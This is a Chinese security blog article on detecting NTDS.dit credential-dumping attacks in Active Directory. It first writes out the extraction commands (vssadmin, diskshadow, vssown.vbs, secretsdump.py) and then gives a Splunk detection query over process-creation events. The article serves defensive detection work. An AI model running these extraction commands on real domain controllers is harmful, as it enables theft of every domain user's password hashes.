---
title: 基于AD Event日志检测NTDS凭据转储攻击
url: https://www.secpulse.com/archives/190884.html
source: 安全脉搏
date: 2022-11-12
fetch_date: 2025-10-03T22:29:31.993133
---

# 基于AD Event日志检测NTDS凭据转储攻击

[![](https://www.secpulse.com/wp-content/themes/secpulse2017/img/logo-header.png)](https://www.secpulse.com "安全脉搏")

* [首页](https://www.secpulse.com/)
* [分类阅读](https://www.secpulse.com/archives/category/category)

  #### 脉搏文库

  - [内网渗透](https://www.secpulse.com/archives/category/articles/intranet-penetration)
  - |
  - [代码审计](https://www.secpulse.com/archives/category/articles/code-audit)
  - |
  - [安全文献](https://www.secpulse.com/archives/category/articles/sec-doc)
  - |
  - [Web安全](https://www.secpulse.com/archives/category/articles/web)
  - |
  - [移动安全](https://www.secpulse.com/archives/category/articles/mobile-security)
  - |
  - [系统安全](https://www.secpulse.com/archives/category/articles/system)
  - |
  - [工控安全](https://www.secpulse.com/archives/category/articles/industrial-safety)
  - |
  - [CTF](https://www.secpulse.com/archives/category/exclusive/ctf-writeup)
  - |
  - [IOT安全](https://www.secpulse.com/archives/category/iot-security)
  - |

#### 安全建设

+ [业务安全](https://www.secpulse.com/archives/category/construction/businesssecurity)
+ |
+ [安全管理](https://www.secpulse.com/archives/category/construction/securityissue)
+ |
+ [数据分析](https://www.secpulse.com/archives/category/construction/bigdata)
+ |

#### 其他

+ [资讯](https://www.secpulse.com/archives/category/news)
+ |
+ [漏洞](https://www.secpulse.com/archives/category/vul)
+ |
+ [工具](https://www.secpulse.com/archives/category/tools)
+ |
+ [人物志](https://www.secpulse.com/archives/category/people)
+ |
+ [区块链安全](https://www.secpulse.com/archives/category/exclusive/block_chain_security)
+ |
+ [安全招聘](https://www.secpulse.com/archives/category/hiring)
+ |

- [安全问答](https://www.secpulse.com/newpage/question_list)
- [金币商城](https://www.secpulse.com/shop?donotcachepage=c010349fd98847cb9d6e07d3cbc19288)
- [安全招聘](https://www.secpulse.com/archives/category/hiring)
- [活动日程](https://www.secpulse.com/newpage/activity)
- [live课程](https://www.secpulse.com/live)
- [企业服务](https://duoyinsu.com/service.html)
- [插件社区](https://x.secpulse.com/)

小程序

![脉搏小程序](https://www.secpulse.com/wp-content/themes/secpulse2017/img/wxchat.jpg)
[登录](https://www.secpulse.com/user_login)
|
[注册](https://www.secpulse.com/user-register)

# 基于AD Event日志检测NTDS凭据转储攻击

[脉搏文库](https://www.secpulse.com/archives/category/category/secdocs)

[Bypass007](https://www.secpulse.com/newpage/author?author_id=6275)
![]( https://www.secpulse.com/wp-content/themes/secpulse2017/img/renzheng0.png)

2022-11-11

8,248

**01、简介**

在域环境里，域内用户hash存储在域控制器(ntds.dit)中的数据库文件中，ntds.dit文件是无法直接被复制的。在这种情况下，我们一般可以利用卷影复制服务(VSS)来实现ntds.dit的拷贝，然后下载进行离线分析和破解用户哈希。

**02、利用VSS实现ntds.dit文件提取**

**（1）vssadmin**

Windows卷影工具，使用Vssadmin来管理VSS，用来创建和删除卷影拷贝。

```
#创建一个新的卷影副本
vssadmin create shadow /for=c:
#将ntds.dit文件复制到新的位置
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\NTDS\ntds.dit c:\ntds.dit
#删除卷影副本
vssadmin delete shadows /for=c: /quiet
```

[![image.png](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2022/11/image2-1024x319.png "image2-1024x319.png")](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2022/11/image2.png)

**（2）ntdsutil**

ntdsutil.exe 是一个命令行工具，可提供对AD的数据库维护功能，执行命令后，生成两个新文件夹：Active Directory 和 Registry，ntds.dit 文件将保存在 Active Directory 中，SAM 和 SYSTEM 文件将保存到registry文件夹。

[![image.png](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2022/11/image3-1024x487.png "image3-1024x487.png")](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2022/11/image3.png)

**（3）DiskShadow**

Diskshadow.exe是一种工具，用于进行 VSS相关的操作。

a、将如下内容保存在command.txt文件：

[![image.png](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2022/11/image14.png "image14.png")](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2022/11/image14.png)

b、进入C:\Windows\System32目录下执行：

```
diskshadow /s C:\command.txt
```

[![image.png](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2022/11/image4-1024x618.png "image4-1024x618.png")](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2022/11/image4.png)

**（4）vssown**

vssown 是一个 vbs 脚本，可以创建和删除卷影副本，github下载地址：

```
https://github.com/lanmaster53/ptscripts/blob/master/windows/vssown.vbs
```

```
#启动卷影拷贝服务
cscript vssown.vbs /start
#创建一个C盘的卷影拷贝
cscript vssown.vbs /create c
#列出卷影考本
cscript vssown.vbs /list
#将目标文件复制出来
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy4\windows\NTDS\ntds.dit c:\\ntds.dit
#删除卷影拷贝
cscript vssown.vbs /delete {71E09CF1-5FF4-4F29-B676-B669A28713DC}
```

[![image.png](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2022/11/image5-1024x621.png "image5-1024x621.png")](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2022/11/image5.png)

**（5）离线破解**

通过卷影拷贝服务（vss）提取ntds.dit，需要将ntds.dit、system和sam文件 下载到本地，通过 impacket 套件中的 secretsdump.py 脚本进行破解:

secretsdump.py -sam sam.hive -system system.hive -ntds ntds.dit LOCAL

[![image.png](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2022/11/image6-1024x466.png "image6-1024x466.png")](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2022/11/image6.png)

**03、NTDS凭据转存攻击检测**

基于以上ntds.dit文件提取的方式，通过AD Event日志监测有两种思路：

（1）在System日志中，调用卷影复制服务(VSS)会生成Event ID为7036的事件，但没有记录用户信息，无法判断来源，容易误报。

[![image.png](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2022/11/image11.png "image11.png")](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2022/11/image11.png)

（2）在Security日志中，通过监测创建vssadmin、ntdsutil、diskshadow、cscript的进程名称，可以找出谁什么时间在哪台服务器上做了VSS相关的操作，实时检测异常的攻击行为。

```
index=ad EventCode=4688  match_src_user!="*$" NewProcessName IN ("*vssadmin.exe","*ntdsutil.exe","*diskshadow.exe","*cscript.exe")
| stats count  min(_time) as  start_time max(_time) as end_time by  match_src_user ComputerName   NewProcessName
| rename match_src_user as user| eval start_time=strftime(start_time,"%Y-%m-%d %H:%M:%S")| eval end_time=strftime(end_time,"%Y-%m-%d %H:%M:%S")
| eval message="在"+start_time+"到"+end_time+"时间内，服务器:"+ComputerName +"疑似遭受NTDS凭据转存攻击"+count+"次,新进程:"+NewProcessName+" 操作账号:"+user
| table start_time end_time user  message
```

[![image.png](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2022/11/image10-1024x283.png "image10-1024x283.png")](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2022/11/image10.png)

```

```

**本文作者：[Bypass007](newpage/author?author_id=6275)**

**本文为安全脉搏专栏作者发布，转载请注明：**[**https://www.secpulse.com/archives/190884.html**](https://www.secpulse.com/archives/190884.html)

Tags: [AD Event日志](https://www.secpulse.com/archives/tag/ad-event%E6%97%A5%E5%BF%97)、[DiskShadow](https://www.secpulse.com/archives/tag/diskshadow)、[NTDS](https://www.secpulse.com/archives/tag/ntds)、[ntdsutil](https://www.secpulse.com/archives/tag/ntdsutil)、[vssadmin](https://www.secpulse.com/archives/tag/vssadmin)、[vssown](https://www.secpulse.com/archives/tag/vssown)、[离线破解](https://www.secpulse.com/archives/tag/%E7%A6%BB%E7%BA%BF%E7%A0%B4%E8%A7%A3)

点赞：
2
[评论：0](#goComment)
收藏：
0

*新浪微博
QQ空间
微信扫一扫*

### 相关文章

* [![基于AD Event日志监测AdminSDHolder](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2023/02/1675840696859-300x178.png)

  基于AD Event日志监测AdminS…](https://www.secpulse.com/archives/195575.html "详细阅读 基于AD Event日志监测AdminSDHolder")
* [![基于AD Event日志检测哈希传递攻击](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2022/12/1671003502213-300x200.png)

  基于AD Event日志检测哈希传递攻击](https://www.secpulse.com/archives/193527.html "详细阅读 基于AD Event日志检测哈希传递攻击")
* [![NTDS.dit密码快速提取工具](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2015/04/ntds.png)

  NTDS.dit密码快速提取工具](https://www.secpulse.com/archives/6301.html "详细阅读 NTDS.dit密码快速提取工具")

评论  (0)

昵称

必填
您当前尚未登录。
[登录？](https://www.secpulse.com/user_login "登录")
[注册](https://www.secpulse.com/user-register)

邮箱

必填（保密）

快来写下你的想法吧！

upload

|  |  |  |
| --- | --- | --- |
| [![]( https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads...